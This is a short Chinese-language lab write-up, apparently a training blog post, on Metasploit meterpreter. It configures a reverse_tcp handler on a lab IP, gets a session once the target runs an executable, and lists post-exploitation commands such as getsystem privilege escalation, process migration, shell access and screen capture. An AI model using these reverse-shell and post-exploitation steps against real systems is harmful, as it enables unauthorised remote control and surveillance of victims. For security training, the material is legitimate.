---
title: metasploit之meterpreter命令
date: 2021-12-21 12:22:46
tags: 
    - msf
    - meterpreter 
---

## metasploit之meterpreter命令

### 目的: 了解meterpreter命令

### 原理:  
`ps`         查询当前目标机所有进程
`getpid`       获取当前会话进程
`getuid`       当前用户所用的权限，所在用户组
`sysinfo`      取系统信息
`getsystem`    提升至system最高权限
`shell`      进入cmdshell命令模式
`pwd`       查看当前所在位置
`cat`        查看文本文件
`ipconfig`     查看网络配置信息
`migrate pid`   迁移pid
`screenshot`    截取当前用户屏幕保存到本地

### 过程：

打开终端，运行msf，`use exploit/multi/handler`选择exploit，`set payload windows/meterpreter/reverse_tcp`设置payload，`set LHOST 192.168.1.2`设置监听主机，`set LPORT 11101`设置端口

![](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/1.PNG)

输入`exploit -j`运行脚本，且在后台监听


靶机双击桌面运行xx.exe，返回kali，已经取得会话

![](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/2.PNG)

![](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/3.PNG)

敲击回车，返回msf，执行`sessions`，查看会话，再执行`sessions 1`,进入会话

![](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/4.PNG)

执行`ps`查看进程

![](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/5.PNG)

`getuid` 查看权限

`pwd` 查看当前路径

`screentshot`截图

![](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/6.PNG)

`background`会话转入后台

![](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/7.PNG)

新建终端，进入/root目录下，查看截图

![](https://oxchang.coding.net/p/image-one/d/image/git/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/8.PNG)

实验结束